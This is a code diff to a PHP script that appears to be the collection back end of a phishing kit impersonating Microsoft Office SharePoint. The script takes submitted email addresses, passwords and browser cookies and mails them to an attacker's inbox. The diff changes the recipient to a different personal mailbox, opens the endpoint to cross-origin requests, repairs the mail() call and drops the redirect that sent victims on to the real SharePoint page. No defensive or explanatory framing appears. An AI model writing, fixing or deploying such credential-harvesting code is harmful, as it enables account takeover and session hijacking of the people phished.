@@ -1,12 +1,16 @@
 <?php
-header('Access-Control-Allow-Origin: *');
+error_reporting(1);
+header("Access-Control-Allow-Origin: *");
+header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
+header("Access-Control-Allow-Headers: x-test-header, Origin, X-Requested-With, Content-Type, Accept");
 header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Max-Age: 604800');
-header("Content-type: application/json");
 
 $content_raw = file_get_contents("php://input"); 
 $data = json_decode($content_raw, true);
 $message = $headers = "";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 if($data["email"] != "" and $data["password"] != ""){
     $message .= "-------------- LOGIN -----------------------\n";
     $message .= "\n";
@@ -23,11 +27,11 @@ if($data["email"] != "" and $data["password"] != ""){
     $message .= "|Client cookie:  ".$data['cookie']."\n";
     $message .= "\n";
     $message .= "|----------- END --------------|\n";
-    $recipient = "mary.rose.ogar.001@proton.me";
+    $recipient = "pcollinsomb@gmail.com";
     $sender = "Office sharepoint L0Gs<d4rkl4b.pw>";
-    $subject = "Office sharepoint  | ".$ip."\n";
-    $headers .= "Office sharepoint\n";
+    $subject = "Office sharepoint  \n";
     var_dump($message);exit;
-    mail($recipient,$sender, $subject,$message,$headers);
+    $mail = mail($recipient, $subject,$message, $headers);
+    var_dump($mail);
     }
-    header ("Location: https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration");
+    
